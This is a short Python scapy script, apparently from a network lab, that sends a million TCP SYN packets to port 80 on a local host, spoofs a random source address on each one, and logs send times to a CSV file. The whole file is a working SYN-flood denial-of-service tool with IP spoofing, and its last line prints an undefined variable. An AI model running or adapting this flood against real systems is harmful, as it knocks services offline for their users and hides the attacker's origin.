from scapy.all import *
import random
import time
import csv

my_file = open('syns_results_p.csv', 'w')
writer = csv.writer(my_file)
writer.writerow(["Index" , "Time_send"])
counter = 1
syn_packet = TCP(sport=1500, dport=80, flags="S", seq=100)
ip=IP(src="192.168.0.6", dst="192.168.0.4")
for num_loop in range(100):
    for num_mass in range(10000):
        start = time.perf_counter()
        ip.src  = f"{random.randint(1,200)}.{random.randint(1,200)}.{random.randint(1,200)}.{random.randint(1,200)}"
        send(ip/syn_packet)
        writer.writerow([counter, (time.perf_counter() - start)])
        print(counter)
        counter +=1

print(avarage)